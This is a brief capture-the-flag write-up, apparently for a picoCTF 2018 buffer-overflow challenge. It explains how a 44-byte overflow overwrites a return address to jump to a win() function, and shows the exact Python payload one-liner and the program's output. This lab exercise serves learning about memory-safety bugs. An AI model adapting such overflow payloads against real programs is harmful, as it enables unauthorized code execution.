Looking at the source code, we need to overflow the buffer and overwrite the return address of the function,
which the code will then jump to and execute. Using gdb, we can find that the address of the
win() function is located at 0x80485cb, which we encode as little endian as a part of our overflow payload.

james9909@pico-2018-shell-3:/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613$ python -c "print 'A'*44 + '\xcb\x85\x04\x08'" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
